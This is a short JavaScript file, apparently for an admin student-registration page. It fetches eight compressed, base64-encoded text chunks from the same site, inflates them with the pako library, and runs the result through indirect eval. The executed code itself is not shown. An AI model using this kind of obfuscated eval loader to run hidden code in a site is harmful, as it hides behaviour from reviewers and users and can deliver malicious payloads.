/* admin-students-reg — 8 zlib+b64 parts + pako */
(function () {
  function loadPako() {
    return new Promise(function (resolve, reject) {
      if (window.pako) return resolve();
      var s = document.createElement("script");
      s.src = "https://cdn.jsdelivr.net/npm/pako@2.1.0/dist/pako.min.js";
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error("pako")); };
      document.head.appendChild(s);
    });
  }
  var n = 8, paths = [];
  for (var i = 0; i < n; i++) paths.push("/_reg_z" + i + ".txt");
  Promise.all([
    loadPako(),
    Promise.all(paths.map(function (f) {
      return fetch(f, { credentials: "same-origin", cache: "no-store" }).then(function (r) {
        if (!r.ok) throw new Error(f + " " + r.status);
        return r.text();
      });
    }))
  ]).then(function (res) {
    var b64 = res[1].join("").replace(/\s+/g, "");
    var bin = atob(b64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    (0, eval)(pako.inflate(bytes, { to: "string" }));
  }).catch(function (e) {
    console.error("[students-reg] load failed", e);
  });
})();
